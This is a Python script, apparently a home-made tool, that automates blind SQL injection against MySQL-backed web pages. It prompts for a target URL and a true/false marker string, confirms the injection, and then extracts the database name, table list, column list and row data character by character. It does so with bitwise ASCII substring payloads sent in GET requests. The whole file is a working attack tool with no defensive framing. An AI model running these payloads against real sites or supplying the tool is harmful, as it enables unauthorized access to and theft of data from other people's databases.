import requests
import sys

# MySQL Blind SQL Injection automation Tools
def blind_sql_injection_attack():
    URL = input("Enter the target URL for the attack : ")
    query = input("Enter the vulnerabilities detection query (Ex: 'and'1'='1'%23) ")
    control_point = input("Enter a string of control points to detect if a blind sql injection attack is true or false : ")
    print(f"vulnerabilities detection query : {URL}{query}")

    resp = requests.get(f"{URL}{query}")
    if control_point in resp.text:
        print("Blind SQL injection vulnerability exists. Start the attack.")
        database = database_name(URL, control_point)
        table_name(URL, database, control_point)
        table = column_name(URL, control_point)
        query_data(URL, table, control_point)
    else:
        print("No blind SQL injection vulnerabilities were found.")

def database_name(URL, control_point):
    binary_number = [1, 2, 4, 8, 16, 32, 64]
    binary_result = 0
    database = ""
    for x in range(1, 20):
        for n in binary_number:
            resp = requests.get(f"{URL}'and+(ascii(substring(database(),{x},1))%26{n}={n})+and'1'='1")
            if control_point in resp.text:
                binary_result += n
            else:
                continue
        if binary_result == 0:
            break
        else:
            database += chr(binary_result)
            binary_result = 0

    print(f"database name : {database}")
    return database

def attack_payload(URL, query, control_point):
    binary_number = [1, 2, 4, 8, 16, 32, 64]
    binary_result = 0
    result = []
    for i in range(0, 30):
        data = ""
        for j in range(1, 30):
            for k in binary_number:
                payload = f"{URL}'and+(ascii(substring(({query}+limit+{i},1),{j},1))%26{k}={k})+and'1'='1"
                resp = requests.get(payload)
                if control_point in resp.text:
                    binary_result += k # 이진수 총합을 구한다.
                else:
                    continue
            if binary_result == 0:
                break # 이진수 합이 0이면 다음 데이터를 추출한다.
            else:
                data += chr(binary_result) # 이진수 합, 10진수를 문자열로 변환해 데이터를 추출한다.
                binary_result = 0
        if len(data) == 0:
            break # 더 이상 추가할 데이터가 없다면 반복문을 종료한다.
        else:
            result.append(data) # 한 개의 데이터 추출이 완료되면 리스트에 담고 다음 데이터를 추출한다.
    return result

def table_name(URL, database, control_point):
    query = f"select+table_name+from+information_schema.tables+where+table_schema='{database}'"
    table = attack_payload(URL, query, control_point)
    print(f"The list of tables in the {database} database.\n{table}")

def column_name(URL, control_point):
    table_name = input("Enter a table name to output a list of columns in that table. : ")
    query = f"select+column_name+from+information_schema.columns+where+table_name='{table_name}'"
    columns = attack_payload(URL, query, control_point)
    print(f"The list of columns in the {table_name} table.\n{columns}")
    return table_name

def query_data(URL, table_name, control_point):
    column_name = input("Enter a column name to output a list of data in that column. : ")
    query = f"select+{column_name}+from+{table_name}"
    data = attack_payload(URL, query, control_point)
    print(f"The result of looking up the data in the {column_name} column.\n{data}")

    quit_button = input("Do you want to end the SQLi attack? (Y or N) ")
    if quit_button.upper() == "Y":
        sys.exit(0)
    else:
        query_data(URL, table_name, control_point)
